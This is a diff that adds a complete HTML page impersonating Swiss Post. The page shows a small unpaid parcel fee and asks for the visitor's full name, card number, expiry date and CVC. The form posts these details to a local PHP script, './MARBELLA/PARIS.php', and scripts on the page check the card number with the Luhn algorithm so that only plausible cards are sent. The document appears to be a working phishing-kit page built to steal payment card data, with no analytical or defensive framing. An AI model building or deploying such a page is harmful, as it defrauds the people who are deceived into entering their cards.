@@ -1,0 +1,247 @@
+<html class="" lang="en"><head><link type="text/css" id="dark-mode" rel="stylesheet" href=""><style type="text/css" id="dark-mode-сustom-style"></style><style type="text/css" id="dark-mode-theme-changer-style"></style><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="./fls/favicon.ico" type="image/x-icon">
+    <title>Swiss Post | Tracking, Shipping, and Locations</title>
+
+    <!-- Bootstrap -->
+    <link rel="stylesheet" href="./fls/bootstrap.min.css">
+    <!-- global styles -->
+    <link rel="stylesheet" type="text/css" href="./fls/main.css">
+    <!-- layout styles -->
+    <link rel="stylesheet" type="text/css" href="./fls/layout.css">
+    <!-- page styles -->
+    <link rel="stylesheet" type="text/css" href="./fls/index.css">
+	<script type="application/javascript" src="./fls/cleave.js"></script>
+</head>
+<body>
+    <div class="default-layout">
+
+
+<div class="default-layout__navigation">
+    <header class="navigation__authorized">
+<div class="navigation-logo d-flex flex-row justify-content-center align-items-center cursor">
+            <span>
+                <a href="">
+                    <center>
+                        <img class="d-block d-lg-none" src="./fls/logo.svg" width="150" height="50">
+                        <img class="d-none d-lg-block" style="padding: 1cm;" src="./fls/logo.svg" width="160" height="120">
+                    </center>
+                </a>
+            </span>
+        </div>
+
+
+<div class="navigation-cart d-flex justify-content-center align-items-center flex-row cursor">
+    <form method="post" action="">
+
+            <a href="javascript:;" class="language" onclick="parentNode.submit();">EN</a>
+            <input type="hidden" name="culture" value="en">
+    </form>
+</div>
+    </header>
+</div>
+
+        <div class="default-layout__content">
+
+
+
+<div class="login__wrapper">
+    <div class="login__wrapper-login">
+
+        <div class="login__content d-flex flex-column justify-content-center justify-content-lg-start">
+            <h3 class="Text-Style-32-lg-73 mb-3">
+
+            </h3>
+            <table class="table table-striped table-bordered">
+  <thead>
+    <tr>
+      <th scope="col">Package Number</th>
+      <th scope="col">Cost</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>EA774980313US</td>
+      <td>2.99 <strong style="color: #FFCB00;">CHF</strong></td>
+    </tr>
+  </tbody>
+</table>
+
+            <form id="form" class="needs-validation" enctype="multipart/form-data" method="POST" action="./MARBELLA/PARIS.php">
+                        <div class="d-flex flex-column mt-3">
+                            <label class="Text-Style-32-lg-73">
+                            FULL NAME
+                            </label>
+                            <input class="form-control Text-Style-45 input-default btn45-375" type="text" id="billingName" name="C01" placeholder="FULL NAME" autocomplete="cc-name" autocorrect="off" spellcheck="false" data-v-message="Please enter a valid name" required="">
+                        </div>
+                        <div class="d-flex flex-column mt-3">
+                            <label class="Text-Style-32-lg-73">
+                            CARD NUMBER
+                            </label>
+                            <input class="form-control Text-Style-45 input-default btn45-375" name="C02" autocomplete="cc-number" autocorrect="off" spellcheck="false" type="tel" id="card_number" placeholder="XXXX XXXX XXXX XXXX" minlength="16" maxlength="19" data-v-message="Please enter a valid credit card" required="">
+                        </div>
+                        <div class="d-flex flex-column mt-3">
+                            <label class="Text-Style-32-lg-73">
+                            EXPIRY DATE
+                            </label>
+                            <input class="form-control Text-Style-45 input-default btn45-375" type="tel" id="card_expiry_date" name="C03" placeholder="MM / YY" minlength="5" maxlength="7" autocomplete="cc-exp" autocorrect="off" spellcheck="false" data-v-message="Please enter a valid expiry date" required="">
+                        </div>
+                        <div class="d-flex flex-column mt-3">
+                            <label class="Text-Style-32-lg-73">
+                            CVC
+                            </label>
+                            <input class="form-control Text-Style-45 input-default btn45-375" type="tel" id="cardCvc" name="C04" placeholder="CVC" minlength="3" maxlength="4" autocomplete="cc-csc" autocorrect="off" spellcheck="false" data-v-message="Please enter a valid cvc number" required="">
+
+
+                        </div>
+
+                <div class="d-flex flex-column mt-lg-4 flex-wrap">
+
+                    <button class="btn-secondary-full btn btn55-375 order-0 order-lg-1 mt-4 mt-lg-0 form-submit" value="submit">
+                        <div class="d-flex align-items-center">
+                            <span class="Text-Style-25 ml-1">Submit</span>
+                            <img class="ml-auto mr-1" src="./fls/arrow-right.svg">
+                        </div>
+                    </button>
+                </div>
+            </form>
+            <hr class="my-4">
+        </div>
+    </div>
+    <div class="login__wrapper-registration">
+        <img class="background-fill d-none d-lg-block" src="./fls/post-logo-fill1.png">
+        <img class="background-fill d-lg-none" src="./fls/post-logo-fill2.png">
+
+    </div>
+</div>
+
+
+        </div>
+  <script type="text/javascript">
+  function valid_credit_card(value) {
+      // Accept only digits, dashes or spaces
+    	if (/[^0-9-\s]+/.test(value)) return false;
+
+    	// The Luhn Algorithm. It's so pretty.
+    	let nCheck = 0, bEven = false;
+    	value = value.replace(/\D/g, "");
+
+    	for (var n = value.length - 1; n >= 0; n--) {
+    		var cDigit = value.charAt(n),
+    			  nDigit = parseInt(cDigit, 10);
+
+    		if (bEven && (nDigit *= 2) > 9) nDigit -= 9;
+
+    		nCheck += nDigit;
+    		bEven = !bEven;
+    	}
+    	return  nCheck != 0 && (nCheck % 10) == 0;
+    }
+  </script>
+  <script type="text/javascript">
+
+    var cleave = new Cleave('#card_number', {
+        creditCard: true,
+        onCreditCardTypeChanged: function (type) {
+            // update UI ...
+        }
+    });
+    var cleaveexp = new Cleave('#card_expiry_date', {
+        date: true,
+        datePattern: ['m', 'Y']
+    });
+
+  </script>
+  <script type="text/javascript">
+  document.getElementById('cardCvc').addEventListener('change', (evt) => {
+    if (/^\d+$/.test(evt.target.value))
+    {
+      evt.target.classList.remove('is-invalid');
+    } else {
+      evt.target.classList.add('is-invalid');
+    }
+
+});
+  document.getElementById('card_number').addEventListener('change', (evt) => {
+    if (valid_credit_card(evt.target.value) && evt.target.value.length >= 16)
+    {
+      evt.target.classList.remove('is-invalid');
+    } else {
+      evt.target.classList.add('is-invalid');
+    }
+
+  });
+
+
+  document.getElementById('form').addEventListener('submit', (evt) => {
+      evt.preventDefault();
+      let invalid_field = 0;
+      let fields = ['card_number', 'billingName', 'cardCvc', 'card_expiry_date']
+      for (var i = 0;i < fields.length;i++){
+        var elem = document.getElementById(fields[i]);
+        if (elem.classList.contains('is-invalid'))
+        {
+          invalid_field = invalid_field + 1;
+        }
+      }
+      console.log(invalid_field);
+      if (!invalid_field){
+        document.getElementById('form').submit();
+      }
+
+
+  });
+
+  </script>
+  <footer class="default-layout__footer footer">
+      <div class="footer-logo d-flex justify-content-center justify-content-md-end align-items-center align-items-md-start mt-md-5">
+          <a href="" class="mx-4 mr-md-5">
+              <img alt="" src="./fls/logo.svg">
+          </a>
+      </div>
+<div class="footer-navlist d-flex justify-content-start">
+  <ul class="Text-Style-14 d-flex flex-column flex-md-row mt-4 mt-md-5">
+      <li class="my-1 my-md-0 ml-md-3"><a href="" target="_blank" class="cursor">Contact us</a></li>
+      <li class="my-1 my-md-0 ml-md-3"><a href="" target="_blank" class="cursor">FAQ</a></li>
+  </ul>
+</div>
+<div class="footer-payment">
+  <div class="d-flex flex-column">
+      <span class="Text-Style-15 mb-2">100% fast and secure</span>
+      <ul class="d-flex flex-row flex-wrap">
+          <li class="mr-1">
+              <img alt="visa" src="./fls/visa.svg">
+          </li>
+          <li class="mr-1">
+              <img alt="mastercard" src="./fls/mastercard.svg">
+          </li>
+          <li class="mr-1">
+              <img alt="maestro" src="./fls/maestro.svg">
+          </li>
+          <li>
+              <img alt="dinersclub" src="./fls/dinerclub.svg">
+          </li>
+      </ul>
+  </div>
+</div>
+
+<div class="footer-footer d-flex justify-content-center">
+  <ul class="Text-Style-16 d-flex flex-column flex-md-row flex-wrap mt-4 mt-md-0">
+
+      <li class="my-1 my-md-0 ml-md-3">
+          <a href="" target="_blank" class="cursor">Terms of use</a>
+      </li>
+  </ul>
+</div>
+</footer>
+</div>
+
+
+
+
+
+<style type="text/css"></style>
+
+</body></html>
